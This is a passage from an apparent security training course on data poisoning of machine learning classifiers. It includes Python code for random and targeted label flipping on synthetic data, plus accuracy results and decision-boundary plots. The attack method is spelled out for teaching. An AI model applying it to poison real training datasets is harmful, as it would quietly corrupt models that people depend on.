    s=<span class="hljs-number">50</span>,
    alpha=<span class="hljs-number">0.5</span>,
    <span class="hljs-built_in">label</span>=<span class="hljs-string">"Clean Data Points"</span>,
)

contour_colors = {
    <span class="hljs-number">0.0</span>: htb_green,
    <span class="hljs-number">0.10</span>: aquamarine,
    <span class="hljs-number">0.20</span>: nugget_yellow,
    <span class="hljs-number">0.30</span>: vivid_purple,
    <span class="hljs-number">0.40</span>: azure,
    <span class="hljs-number">0.50</span>: malware_red,
}
contour_linestyles = {
    <span class="hljs-number">0.0</span>: <span class="hljs-string">"solid"</span>,
    <span class="hljs-number">0.10</span>: <span class="hljs-string">"dashed"</span>,
    <span class="hljs-number">0.20</span>: <span class="hljs-string">"dashed"</span>,
    <span class="hljs-number">0.30</span>: <span class="hljs-string">"dashed"</span>,
    <span class="hljs-number">0.40</span>: <span class="hljs-string">"dashed"</span>,
    <span class="hljs-number">0.50</span>: <span class="hljs-string">"dashed"</span>,
}

# Get baseline boundary data
baseline_model_idx = results[<span class="hljs-string">"percentage"</span>].index(<span class="hljs-number">0.0</span>)
baseline_model_retrieved = results[<span class="hljs-string">"model"</span>][baseline_model_idx]
<span class="hljs-keyword">if</span> baseline_model_retrieved:
    Z_baseline = baseline_model_retrieved.predict(mesh_points).reshape(xx.shape)
    cs = plt.<span class="hljs-built_in">contour</span>(
        xx,
        yy,
        Z_baseline,
        levels=[<span class="hljs-number">0.5</span>],
        colors=[contour_colors[<span class="hljs-number">0.0</span>]],
        linestyles=[contour_linestyles[<span class="hljs-number">0.0</span>]],
        linewidths=[<span class="hljs-number">2.5</span>],
    )

boundary_indices_to_plot = [<span class="hljs-number">0.10</span>, <span class="hljs-number">0.20</span>, <span class="hljs-number">0.30</span>, <span class="hljs-number">0.40</span>, <span class="hljs-number">0.50</span>]
plotted_percentages = [<span class="hljs-number">0.0</span>]

# Sort decision_boundaries_data by percentage to ensure consistent plotting order
decision_boundaries_data.<span class="hljs-built_in">sort</span>(<span class="hljs-built_in">key</span>=<span class="hljs-built_in">lambda</span> item: item[<span class="hljs-string">"percentage"</span>])

<span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> decision_boundaries_data:
    pp = data[<span class="hljs-string">"percentage"</span>]
    <span class="hljs-keyword">if</span> pp <span class="hljs-keyword">in</span> boundary_indices_to_plot:
        <span class="hljs-keyword">if</span> pp <span class="hljs-keyword">in</span> contour_colors <span class="hljs-keyword">and</span> pp <span class="hljs-keyword">in</span> contour_linestyles:
            Z = data[<span class="hljs-string">"Z"</span>]
            cs = plt.<span class="hljs-built_in">contour</span>(
                xx,
                yy,
                Z,
                levels=[<span class="hljs-number">0.5</span>],
                colors=[contour_colors[pp]],
                linestyles=[contour_linestyles[pp]],
                linewidths=[<span class="hljs-number">2.5</span>],
            )
            plotted_percentages.<span class="hljs-built_in">append</span>(pp)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Warning: Style not defined for {pp * 100}%, skipping contour."</span>)


plt.<span class="hljs-built_in">title</span>(
    <span class="hljs-string">"Shift in Decision Boundary with Increasing Label Flipping"</span>,
    fontsize=<span class="hljs-number">16</span>,
    <span class="hljs-built_in">color</span>=htb_green,
)
plt.<span class="hljs-built_in">xlabel</span>(<span class="hljs-string">"Feature 1"</span>, fontsize=<span class="hljs-number">12</span>)
plt.<span class="hljs-built_in">ylabel</span>(<span class="hljs-string">"Feature 2"</span>, fontsize=<span class="hljs-number">12</span>)

# Create <span class="hljs-built_in">legend</span>
legend_handles = []
<span class="hljs-keyword">for</span> pp <span class="hljs-keyword">in</span> sorted(plotted_percentages):
    <span class="hljs-keyword">if</span> (
        pp <span class="hljs-keyword">in</span> contour_colors <span class="hljs-keyword">and</span> pp <span class="hljs-keyword">in</span> contour_linestyles
    ):  # Check again before creating <span class="hljs-built_in">legend</span> entry
        legend_handles.<span class="hljs-built_in">append</span>(
            plt.Line2D(
                [<span class="hljs-number">0</span>],
                [<span class="hljs-number">0</span>],
                <span class="hljs-built_in">color</span>=contour_colors[pp],
                lw=<span class="hljs-number">2.5</span>,
                linestyle=contour_linestyles[pp],
                <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Boundary ({pp * 100:.0f}% Poisoned)"</span>,
            )
        )

# Add <span class="hljs-built_in">legend</span> <span class="hljs-keyword">for</span> data <span class="hljs-built_in">points</span> as well
data_handles = [
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"o"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Class 0"</span>,
        markersize=<span class="hljs-number">10</span>,
        markerfacecolor=azure,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"o"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Class 1"</span>,
        markersize=<span class="hljs-number">10</span>,
        markerfacecolor=nugget_yellow,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
]

plt.<span class="hljs-built_in">legend</span>(handles=legend_handles + data_handles, <span class="hljs-built_in">title</span>=<span class="hljs-string">"Boundaries &amp; Data"</span>)
plt.<span class="hljs-built_in">grid</span>(True, <span class="hljs-built_in">color</span>=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, <span class="hljs-built_in">linewidth</span>=<span class="hljs-number">0.5</span>, alpha=<span class="hljs-number">0.3</span>)
plt.xlim(xx.<span class="hljs-built_in">min</span>(), xx.<span class="hljs-built_in">max</span>())
plt.ylim(yy.<span class="hljs-built_in">min</span>(), yy.<span class="hljs-built_in">max</span>())
plt.<span class="hljs-built_in">show</span>()
</code></pre>
<p>Which will generate this plot:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_consolidated.png" alt="label\_flipping\_consolidated.png"></p>
<p>Here we can clearly see the <code>decision boundary</code> becoming increasingly distorted as the model attempted to accommodate the incorrect labels for each fraction of poisoned data.</p>
<hr>
<h2 id="targeted-label-attacks">Targeted Label Attacks</h2>
<hr>
<p>So far, we have explored <code>Label Flipping</code>. The primary goal there was general <code>performance degradation</code> - making the model less accurate overall. Now let&#39;s explore a more focused variant of a data poisoning attack: the <code>Targeted Label Attack</code>.</p>
<p>Unlike the broad impact caused by random label flipping, a <code>Targeted Label Attack</code> has a more specific objective: an adversary aims to cause the trained model to <code>misclassify specific, chosen target instances</code> or, more commonly, instances belonging to a particular <code>target class</code>. Instead of just reducing overall accuracy, the adversary wants to manipulate the model&#39;s behavior in a predictable way for certain inputs.</p>
<p>We are going to revisit the same sentiment analysis scenario from the previous attack, but instead of just making the model generally worse at distinguishing <code>positive from negative</code> reviews, we are going to use a targeted approach specifically aiming to make the model misclassify genuinely <code>positive</code> reviews about a product as <code>negative</code>. This requires a slightly more strategic approach to poisoning the data.</p>
<h3 id="the-attack-strategy">The Attack Strategy</h3>
<p>Our strategy is to identify training data points belonging to the <code>target class</code> (e.g., <code>positive</code> reviews, Class 1) and then deliberately change their labels to represent a different class (e.g., <code>negative</code>, Class 0). This focused manipulation directly interferes with the model&#39;s learning process concerning its understanding and classification of the target class.</p>
<p>We have already established that a <code>Logistic Regression</code> model is trained by minimizing the <code>average binary cross-entropy</code> (or <code>log-loss</code>) function, L:</p>
<p>L(𝐰,b)=−1N∑i=1N[yilog(pi)+(1−yi)log(1−pi)]</p>
<p>Here, yi is the true label (0 or 1), and pi is the model’s predicted probability that instance 𝐱i belongs to <code>Class 1</code>, calculated as pi=σ(𝐰T𝐱i+b), where σ is the <code>sigmoid function</code>, and as we know, the model adjusts its weights 𝐰 and bias b to make the predicted probabilities pi align closely with the true labels yi, thus minimizing L.</p>
<p>Now, consider a targeted attack aiming to make the model misclassify <code>Class 1</code> instances as <code>Class 0</code>. The adversary selects a subset of training instances (𝐱j,yj) where the true label yj is 1. They then change these labels in the training data to yj′=0.</p>
<p>During training, when the model processes such a poisoned instance 𝐱j, it is expected to calculate a high probability pj (close to 1) because the features of 𝐱j strongly suggest it belongs to <code>Class 1</code>.</p>
<p>With the original label (yj=1), the contribution to the loss for this instance would be −log⁡(pj), which is small if pj is high (close to 1).With the flipped label (yj′=0), the contribution to the loss becomes −log⁡(1−pj). Since pj is high, (1−pj) is low (close to 0), making −log⁡(1−pj) <code>a very large positive value</code>.</p>
<p>This large error signal, specifically generated by instances that look like <code>Class 1</code> but are labeled as <code>Class 0</code>, significantly impacts the parameter updates during optimization (e.g., by yielding large gradients). The model is forced to adjust 𝐰 and b to reduce this artificially large error. This adjustment inevitably pushes the <code>decision boundary</code> - the threshold defined by 𝐰T𝐱+b=0 where the model is uncertain (p=0.5) - away from its optimal position. In other words, the boundary shifts specifically to incorrectly classify more of the feature region associated with true <code>Class 1</code> instances as <code>Class 0</code>. This creates the intended bias, making the model prone to misclassifying genuine <code>Class 1</code> samples.</p>
<h3 id="attack-implementation">Attack Implementation</h3>
<p>To execute this strategy, we define a new function that will allow us to specify <code>which class</code> to target and what percentage of <code>only that class&#39;s samples</code> should have their labels flipped.</p>
<p>The logic looks like the following:</p>
<ol>
<li>Identify all training samples belonging to the designated <code>target_class</code>.</li>
<li>Calculate the number of samples to flip based on the <code>poison_percentage</code> applied only to the count of target class samples.</li>
<li>Randomly select that number of samples <code>from the identified target class indices</code>.</li>
<li>Flip the labels of these selected samples to the opposite class.</li>
</ol>
<p>First, we define the function signature and perform essential input validation. We check if <code>poison_percentage</code> is within the valid range [0, 1]. We also ensure the <code>target_class</code> and <code>new_class</code> are distinct and that both specified classes actually exist within the provided label array <code>y</code>. Raising errors for invalid inputs prevents unexpected behavior later.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">targeted_flip_labels</span><span class="hljs-params">(y, poison_percentage, target_class, new_class, seed=<span class="hljs-number">1337</span>)</span>:</span>

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">0</span> &lt;= poison_percentage &lt;= <span class="hljs-number">1</span>:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"poison_percentage must be between 0 and 1."</span>)
    <span class="hljs-keyword">if</span> target_class == new_class:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"target_class and new_class cannot be the same."</span>)
    <span class="hljs-comment"># Ensure target_class and new_class are present in y</span>
    unique_labels = np.unique(y)
    <span class="hljs-keyword">if</span> target_class <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> unique_labels:
         <span class="hljs-keyword">raise</span> ValueError(f<span class="hljs-string">"target_class ({target_class}) does not exist in y."</span>)
    <span class="hljs-keyword">if</span> new_class <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> unique_labels:
         <span class="hljs-keyword">raise</span> ValueError(f<span class="hljs-string">"new_class ({new_class}) does not exist in y."</span>)
</code></pre>
<p>Next, we identify the specific samples belonging to the <code>target_class</code>. We use <code>np.where</code> to find all indices in the label array <code>y</code> where the label matches <code>target_class</code>. The number of such samples (<code>n_target_samples</code>) is stored. If no samples of the <code>target_class</code> are found, we print a warning and return the original labels unchanged, as no flipping is possible.</p>
<p>Code: python</p>
<pre><code class="lang-python">    # Identify <span class="hljs-built_in">indices</span> belonging to the target class
    target_indices = <span class="hljs-built_in">np</span>.where(y == target_class)[<span class="hljs-number">0</span>]
    n_target_samples = len(target_indices)

    <span class="hljs-keyword">if</span> n_target_samples == <span class="hljs-number">0</span>:
        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Warning: No samples found for target_class {target_class}. No labels flipped."</span>)
        <span class="hljs-built_in">return</span> y.<span class="hljs-built_in">copy</span>(), <span class="hljs-built_in">np</span>.<span class="hljs-built_in">array</span>([], dtype=int)
</code></pre>
<p>Based on the number of target samples found (<code>n_target_samples</code>) and the desired <code>poison_percentage</code>, we calculate the absolute number of labels to flip (<code>n_to_flip</code>). This calculation ensures the percentage is only applied relative to the size of the target class subset. If the calculated <code>n_to_flip</code> is zero (e.g., due to a very low percentage or small target class size), we issue a warning and return without making changes.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-comment"># Calculate the number of labels to flip within the target class</span>
    n_to_flip = <span class="hljs-keyword">int</span>(n_target_samples * poison_percentage)

    <span class="hljs-keyword">if</span> n_to_flip == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Warning: Poison percentage ({poison_percentage * 100:.1f}%) is too low "</span>
              f<span class="hljs-string">"to flip any labels in the target class (size {n_target_samples})."</span>)
        <span class="hljs-keyword">return</span> y.copy(), np.<span class="hljs-keyword">array</span>([], dtype=<span class="hljs-keyword">int</span>)
</code></pre>
<p>To select which specific samples within the target class will have their labels flipped, we employ a random selection process governed by the provided <code>seed</code> for reproducibility. We initialize a dedicated NumPy random number generator (<code>rng_instance</code>) with this seed. Then, we randomly choose <code>n_to_flip</code> unique indices <code>from the set of target class indices</code> (<code>target_indices</code>).</p>
<p>This selection (<code>indices_within_target_set_to_flip</code>) refers to positions <code>within</code> the <code>target_indices</code> array; we then map these back to the original indices in the full <code>y</code> array to get <code>flipped_indices</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-comment"># Use a dedicated random number generator instance with the specified seed</span>
    <span class="hljs-attr">rng_instance</span> = np.random.default_rng(seed)

    <span class="hljs-comment"># Randomly select indices from the target_indices subset to flip</span>
    <span class="hljs-comment"># These are indices relative to the target_indices array</span>
    <span class="hljs-attr">indices_within_target_set_to_flip</span> = rng_instance.choice(
        n_target_samples, <span class="hljs-attr">size=n_to_flip,</span> <span class="hljs-attr">replace=False</span>
    )
    <span class="hljs-comment"># Map these back to the original array indices</span>
    <span class="hljs-attr">flipped_indices</span> = target_indices[indices_within_target_set_to_flip]
</code></pre>
<p>Now we perform the label flipping. To avoid modifying the input array directly, we create a copy named <code>y_poisoned</code>. Using the <code>flipped_indices</code> obtained above, we access these specific locations in <code>y_poisoned</code> and assign them the value of <code>new_class</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-comment"># Create a copy to avoid modifying the original array</span>
    y_poisoned = y.<span class="hljs-keyword">copy</span>()

    <span class="hljs-comment"># Perform the flip for the selected indices to the new class label</span>
    y_poisoned[flipped_indices] = new_class
</code></pre>
<p>For clarity and verification, we include print statements summarizing the operation: detailing the classes involved, the number of target samples identified, the number intended to be flipped, and the actual number successfully flipped.</p>
<p>Code: python</p>
<pre><code class="lang-python">    print(<span class="hljs-name">f</span><span class="hljs-string">"Targeting Class {target_class} for flipping to Class {new_class}."</span>)
    print(<span class="hljs-name">f</span><span class="hljs-string">"Identified {n_target_samples} samples of Class {target_class}."</span>)
    print(<span class="hljs-name">f</span><span class="hljs-string">"Attempting to flip {poison_percentage * 100:.1f}% ({n_to_flip} samples) of these."</span>)
    print(<span class="hljs-name">f</span><span class="hljs-string">"Successfully flipped {len(flipped_indices)} labels."</span>)
</code></pre>
<p>Finally, the function returns the <code>y_poisoned</code> array containing the modified labels (with the targeted flips applied) and the <code>flipped_indices</code> array, which identifies precisely which samples were altered.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-keyword">return</span> y_poisoned, flipped_indices
</code></pre>
<p>The next step is to generate the poisoned dataset</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-attr">poison_percentage_targeted</span> = <span class="hljs-number">0.40</span>  <span class="hljs-comment"># Target 40%</span>
<span class="hljs-attr">target_class_to_flip</span> = <span class="hljs-number">1</span>  <span class="hljs-comment"># Target Class 1 (Positive)</span>
<span class="hljs-attr">new_label_for_flipped</span> = <span class="hljs-number">0</span>  <span class="hljs-comment"># Flip them to Class 0 (Negative)</span>

<span class="hljs-comment"># Use the function to create the poisoned dataset</span>
y_train_targeted_poisoned, <span class="hljs-attr">targeted_flipped_indices</span> = targeted_flip_labels(
    y_train,
    poison_percentage_targeted,
    target_class_to_flip,
    new_label_for_flipped,
    <span class="hljs-attr">seed=SEED,</span>  <span class="hljs-comment"># Use the global SEED for reproducibility</span>
)

print(<span class="hljs-string">"\n--- Visualizing Targeted Poisoned Data ---"</span>)
<span class="hljs-comment"># Plot the result of the targeted flip</span>
plot_poisoned_data(
    X_train,
    y_train,  <span class="hljs-comment"># Pass original y</span>
    y_train_targeted_poisoned,
    targeted_flipped_indices,
    <span class="hljs-attr">title=f"Training</span> Data: {poison_percentage_targeted * <span class="hljs-number">100</span>:.<span class="hljs-number">0</span>f}% of Class {target_class_to_flip} Flipped to {new_label_for_flipped}<span class="hljs-string">",
    target_class_info=target_class_to_flip,
)</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/302/target_label_flip_poison.png" alt="target\_label\_flip\_poison.png"></p>
<p>Then train a new <code>LogisticRegression</code> model using this poisoned data. We use the original features <code>X_train</code> but pair them with the corrupted labels <code>y_train_targeted_poisoned</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-attr">targeted_poisoned_model</span> = LogisticRegression(<span class="hljs-attr">random_state=SEED)</span>
targeted_poisoned_model.fit(X_train, y_train_targeted_poisoned)
</code></pre>
<hr>
<h2 id="evaluating-the-targeted-label-attack">Evaluating the Targeted Label Attack</h2>
<hr>
<p>With the new model trained, we can next evaluate its performance. We do this by evaluating the poisoned model on the clean test set to</p>
<p>Code: python</p>
<pre><code class="lang-python"># <span class="hljs-keyword">Predict</span> <span class="hljs-keyword">on</span> the original, clean <span class="hljs-keyword">test</span> <span class="hljs-keyword">set</span>
y_pred_targeted = targeted_poisoned_model.<span class="hljs-keyword">predict</span>(X_test)

# Calculate accuracy <span class="hljs-keyword">on</span> the clean <span class="hljs-keyword">test</span> <span class="hljs-keyword">set</span>
targeted_accuracy = accuracy_score(y_test, y_pred_targeted)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"\n--- Evaluating Targeted Poisoned Model ---"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Accuracy on clean test set: {targeted_accuracy:.4f}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Baseline accuracy was: {baseline_accuracy:.4f}"</span>)

# <span class="hljs-keyword">Display</span> classification <span class="hljs-keyword">report</span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"\nClassification Report on Clean Test Set:"</span>)
<span class="hljs-keyword">print</span>(
    classification_report(y_test, y_pred_targeted, target_names=[<span class="hljs-string">"Class 0"</span>, <span class="hljs-string">"Class 1"</span>])
)

# <span class="hljs-keyword">Plot</span> confusion <span class="hljs-built_in">matrix</span>
cm_targeted = confusion_matrix(y_test, y_pred_targeted)
plt.figure(figsize=(6, 5))
sns.heatmap(
    cm_targeted,
    annot=True,
    fmt=<span class="hljs-string">"d"</span>,
    cmap=<span class="hljs-string">"binary"</span>,
    xticklabels=[<span class="hljs-string">"Predicted 0"</span>, <span class="hljs-string">"Predicted 1"</span>],
    yticklabels=[<span class="hljs-string">"Actual 0"</span>, <span class="hljs-string">"Actual 1"</span>],
    cbar=False,
)
plt.xlabel(<span class="hljs-string">"Predicted Label"</span>, color=white)
plt.ylabel(<span class="hljs-string">"True Label"</span>, color=white)
plt.title(<span class="hljs-string">"Confusion Matrix (Targeted Poisoned Model)"</span>, fontsize=14, color=htb_green)
plt.xticks(color=hacker_grey)
plt.yticks(color=hacker_grey)
plt.show()
</code></pre>
<p>Which will output this and the confusion matrix:</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-selector-tag">---</span> <span class="hljs-selector-tag">Evaluating</span> <span class="hljs-selector-tag">Targeted</span> <span class="hljs-selector-tag">Poisoned</span> <span class="hljs-selector-tag">Model</span> <span class="hljs-selector-tag">---</span>
<span class="hljs-selector-tag">Accuracy</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">clean</span> <span class="hljs-selector-tag">test</span> <span class="hljs-selector-tag">set</span>: 0<span class="hljs-selector-class">.8100</span>
<span class="hljs-selector-tag">Baseline</span> <span class="hljs-selector-tag">accuracy</span> <span class="hljs-selector-tag">was</span>: 0<span class="hljs-selector-class">.9933</span>

<span class="hljs-selector-tag">Classification</span> <span class="hljs-selector-tag">Report</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">Clean</span> <span class="hljs-selector-tag">Test</span> <span class="hljs-selector-tag">Set</span>:
              <span class="hljs-selector-tag">precision</span>    <span class="hljs-selector-tag">recall</span>  <span class="hljs-selector-tag">f1-score</span>   <span class="hljs-selector-tag">support</span>

     <span class="hljs-selector-tag">Class</span> 0       0<span class="hljs-selector-class">.73</span>      1<span class="hljs-selector-class">.00</span>      0<span class="hljs-selector-class">.84</span>       153
     <span class="hljs-selector-tag">Class</span> 1       1<span class="hljs-selector-class">.00</span>      0<span class="hljs-selector-class">.61</span>      0<span class="hljs-selector-class">.76</span>       147

    <span class="hljs-selector-tag">accuracy</span>                           0<span class="hljs-selector-class">.81</span>       300
   <span class="hljs-selector-tag">macro</span> <span class="hljs-selector-tag">avg</span>       0<span class="hljs-selector-class">.86</span>      0<span class="hljs-selector-class">.81</span>      0<span class="hljs-selector-class">.80</span>       300
<span class="hljs-selector-tag">weighted</span> <span class="hljs-selector-tag">avg</span>       0<span class="hljs-selector-class">.86</span>      0<span class="hljs-selector-class">.81</span>      0<span class="hljs-selector-class">.80</span>       300
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/302/target_label_confusionmatrix.png" alt="target\_label\_confusionmatrix.png"></p>
<p>The attack dropped the model&#39;s accuracy from the baseline <code>0.9933</code> to <code>0.8100</code>. The classification report shows the specific impact: <code>Class 1</code> recall fell sharply to <code>0.61</code>, meaning the poisoned model correctly identified only 61% of true <code>Class 1</code> instances. Correspondingly, the <code>confusion matrix</code> shows <code>57</code> <code>False Negatives</code> (Actual <code>Class 1</code> predicted as <code>Class 0</code>). This confirms the attack successfully degraded the model&#39;s performance specifically for the intended target class.</p>
<p>We can plot the boundary of the <code>targeted_poisoned_model</code> compared to the <code>baseline_model</code> to clearly see how the boundary has shifted with the attack.</p>
<p>Code: python</p>
<pre><code class="lang-python"># Plot the comparison of decision boundaries
plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">8</span>))

# Plot Baseline Decision Boundary (Solid Green)
Z_baseline = baseline_model.predict(mesh_points).reshape(xx.shape)
plt.<span class="hljs-built_in">contour</span>(
    xx,
    yy,
    Z_baseline,
    levels=[<span class="hljs-number">0.5</span>],
    colors=[htb_green],
    linestyles=[<span class="hljs-string">"solid"</span>],
    linewidths=[<span class="hljs-number">2.5</span>],
)

# Plot Targeted Poisoned Decision Boundary (Dashed Red)
Z_targeted = targeted_poisoned_model.predict(mesh_points).reshape(xx.shape)
plt.<span class="hljs-built_in">contour</span>(
    xx,
    yy,
    Z_targeted,
    levels=[<span class="hljs-number">0.5</span>],
    colors=[malware_red],
    linestyles=[<span class="hljs-string">"dashed"</span>],
    linewidths=[<span class="hljs-number">2.5</span>],
)

plt.<span class="hljs-built_in">title</span>(
    <span class="hljs-string">"Comparison: Baseline vs. Targeted Poisoned Decision Boundary"</span>,
    fontsize=<span class="hljs-number">16</span>,
    <span class="hljs-built_in">color</span>=htb_green,
)
plt.<span class="hljs-built_in">xlabel</span>(<span class="hljs-string">"Feature 1"</span>, fontsize=<span class="hljs-number">12</span>)
plt.<span class="hljs-built_in">ylabel</span>(<span class="hljs-string">"Feature 2"</span>, fontsize=<span class="hljs-number">12</span>)

# Create <span class="hljs-built_in">legend</span> combining data <span class="hljs-built_in">points</span> <span class="hljs-keyword">and</span> boundaries
handles = [
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        <span class="hljs-built_in">color</span>=htb_green,
        lw=<span class="hljs-number">2.5</span>,
        linestyle=<span class="hljs-string">"solid"</span>,
        <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Baseline Boundary (Acc: {baseline_accuracy:.3f})"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        <span class="hljs-built_in">color</span>=malware_red,
        lw=<span class="hljs-number">2.5</span>,
        linestyle=<span class="hljs-string">"dashed"</span>,
        <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Targeted Poisoned Boundary (Acc: {targeted_accuracy:.3f})"</span>,
    ),
]

plt.<span class="hljs-built_in">legend</span>(handles=handles, <span class="hljs-built_in">title</span>=<span class="hljs-string">"Boundaries &amp; Data Points"</span>)
plt.<span class="hljs-built_in">grid</span>(True, <span class="hljs-built_in">color</span>=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, <span class="hljs-built_in">linewidth</span>=<span class="hljs-number">0.5</span>, alpha=<span class="hljs-number">0.3</span>)
plt.xlim(xx.<span class="hljs-built_in">min</span>(), xx.<span class="hljs-built_in">max</span>())
plt.ylim(yy.<span class="hljs-built_in">min</span>(), yy.<span class="hljs-built_in">max</span>())
plt.<span class="hljs-built_in">show</span>()
</code></pre>
<p>Which will generate this image, showing the shift in the boundary:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/targeted_flip_baseline_vs_poisoned_boundary.png" alt="targeted\_flip\_baseline\_vs\_poisoned\_boundary.png"></p>
<p>The plot vividly illustrates the effect of the attack. The <code>targeted poisoned boundary</code> has significantly shifted away from the boundary of the baseline model. The model, forced to accommodate the flipped Class 1 points (now labeled as Class 0), has learned a boundary that is much more likely to classify genuine Class 1 instances as Class 0.</p>
<p>The true test of the attack is how the poisoned model performs on new, previously unseen data. Let&#39;s generate a fresh batch of data points using similar distribution parameters (<code>cluster_std=1.50</code> is a little bigger for a bit of a data spread) as our original dataset but with a different random seed to ensure they are distinct. We will then use our <code>targeted_poisoned_model</code> to classify these points and see how many instances of the target class (Class 1) are misclassified, and display the boundary line.</p>
<p>Code: python</p>
<pre><code class="lang-python"># Define parameters <span class="hljs-keyword">for</span> unseen data generation
n_unseen_samples = <span class="hljs-number">500</span>
unseen_seed = SEED + <span class="hljs-number">1337</span>

# Generate unseen data
X_unseen, y_unseen = make_blobs(
    n_samples=n_unseen_samples,
    centers=centers,
    n_features=<span class="hljs-number">2</span>,
    cluster_std=<span class="hljs-number">1.50</span>,
    random_state=unseen_seed,
)

# Predict <span class="hljs-built_in">labels</span> <span class="hljs-keyword">for</span> the unseen data using the targeted poisoned model
y_pred_unseen_poisoned = targeted_poisoned_model.predict(X_unseen)

# Calculate misclassification statistics
true_target_class_indices = <span class="hljs-built_in">np</span>.where(y_unseen == target_class_to_flip)[<span class="hljs-number">0</span>]
misclassified_target_mask = (y_unseen == target_class_to_flip) &amp; (
    y_pred_unseen_poisoned != target_class_to_flip
)
misclassified_target_indices = <span class="hljs-built_in">np</span>.where(misclassified_target_mask)[<span class="hljs-number">0</span>]
n_true_target = len(true_target_class_indices)
n_misclassified_target = len(misclassified_target_indices)

plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">8</span>))

# Plot all unseen <span class="hljs-built_in">points</span>, colored by the poisoned model's prediction
plt.scatter(
    X_unseen[:, <span class="hljs-number">0</span>],
    X_unseen[:, <span class="hljs-number">1</span>],
    c=y_pred_unseen_poisoned,
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=<span class="hljs-number">50</span>,
    alpha=<span class="hljs-number">0.7</span>,
    <span class="hljs-built_in">label</span>=<span class="hljs-string">"Predicted Label"</span>,
)

# Highlight the misclassified target <span class="hljs-built_in">points</span>
<span class="hljs-keyword">if</span> n_misclassified_target &gt; <span class="hljs-number">0</span>:
    plt.scatter(
        X_unseen[misclassified_target_indices, <span class="hljs-number">0</span>],
        X_unseen[misclassified_target_indices, <span class="hljs-number">1</span>],
        facecolors=<span class="hljs-string">"none"</span>,
        edgecolors=malware_red,
        linewidths=<span class="hljs-number">1.5</span>,
        marker=<span class="hljs-string">"X"</span>,
        s=<span class="hljs-number">120</span>,
        <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Misclassified (True Class {target_class_to_flip})"</span>,
    )

# Calculate <span class="hljs-keyword">and</span> plot decision boundary
Z_targeted_boundary = targeted_poisoned_model.predict(mesh_points).reshape(xx.shape)
plt.<span class="hljs-built_in">contour</span>(
    xx,
    yy,
    Z_targeted_boundary,
    levels=[<span class="hljs-number">0.5</span>],
    colors=[malware_red],
    linestyles=[<span class="hljs-string">"dashed"</span>],
    linewidths=[<span class="hljs-number">2.5</span>],
)

# Set <span class="hljs-built_in">title</span>
plt.<span class="hljs-built_in">title</span>(
    f<span class="hljs-string">"Poisoned Model Predictions &amp; Boundary on Unseen Data\n({n_misclassified_target} of {n_true_target} Class {target_class_to_flip} samples misclassified)"</span>,
    fontsize=<span class="hljs-number">16</span>,
    <span class="hljs-built_in">color</span>=htb_green,
)
plt.<span class="hljs-built_in">xlabel</span>(<span class="hljs-string">"Feature 1"</span>, fontsize=<span class="hljs-number">12</span>)
plt.<span class="hljs-built_in">ylabel</span>(<span class="hljs-string">"Feature 2"</span>, fontsize=<span class="hljs-number">12</span>)

# Create <span class="hljs-built_in">legend</span>
handles = [
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"o"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Predicted as Class 0 (Azure)"</span>,
        markersize=<span class="hljs-number">10</span>,
        markerfacecolor=azure,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
